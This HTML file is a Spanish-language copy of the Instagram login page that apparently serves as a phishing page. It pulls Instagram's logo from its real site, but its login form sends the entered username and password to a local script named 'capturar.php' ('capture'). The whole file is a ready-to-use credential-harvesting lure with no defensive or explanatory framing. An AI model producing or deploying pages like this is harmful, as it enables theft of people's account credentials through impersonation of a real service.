<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #fafafa; }
        .container { width: 350px; margin: 0 auto; margin-top: 50px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 175px; }
        .form-group { margin-bottom: 15px; }
        .form-group input { width: 100%; padding: 10px; box-sizing: border-box; }
        .form-group button { width: 100%; padding: 10px; background-color: #0095f6; color: white; border: none; }
        .form-group a { color: #00376b; text-align: center; display: block; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
        </div>
        <form action="capturar.php" method="post">
            <div class="form-group">
                <input type="text" name="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Contraseña" required>
            </div>
            <div class="form-group">
                <button type="submit">Iniciar sesión</button>
            </div>
        </form>
        <div class="form-group">
            <a href="#">¿Olvidaste tu contraseña?</a>
        </div>
    </div>
</body>
</html>
